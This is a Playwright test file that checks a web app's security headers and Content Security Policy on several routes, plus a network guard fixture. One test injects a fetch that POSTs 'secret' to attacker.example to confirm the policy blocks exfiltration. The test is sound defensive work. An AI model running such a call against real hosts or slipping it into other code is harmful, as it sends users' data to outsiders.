import { test as plain } from '@playwright/test';
import { contentSecurityPolicy } from '../security-headers.ts';
import { expect, test } from './fixtures.ts';

test('every route is served with the strict CSP and security headers', async ({ request }) => {
  for (const path of ['/', '/merge', '/does-not-exist']) {
    const res = await request.get(path);
    const headers = res.headers();
    expect(headers['content-security-policy']).toBe(contentSecurityPolicy());
    expect(headers['x-content-type-options']).toBe('nosniff');
    expect(headers['referrer-policy']).toBe('strict-origin-when-cross-origin');
    expect(headers['x-frame-options']).toBe('DENY');
  }
});

// Without the guard fixture: this test deliberately provokes a violation.
plain('the CSP stops injected code from sending data to another host', async ({ page }) => {
  await page.goto('/');
  const outcome = await page.evaluate(async () => {
    const seen: string[] = [];
    document.addEventListener('securitypolicyviolation', (e) => seen.push(e.violatedDirective));
    try {
      await fetch('https://attacker.example/steal', { method: 'POST', body: 'secret' });
      return { sent: true, seen };
    } catch {
      await new Promise((r) => setTimeout(r, 100));
      return { sent: false, seen };
    }
  });
  expect(outcome.sent).toBe(false);
  expect(outcome.seen).toContain('connect-src');
});

// Self-test of the guard itself: a large same-origin POST must fail the test.
test.fail('the network guard fails a test that sends a file-sized body', async ({ page }) => {
  await page.goto('/');
  await page.evaluate(() =>
    fetch('/', { method: 'POST', body: 'x'.repeat(4096) }).catch(() => undefined),
  );
});
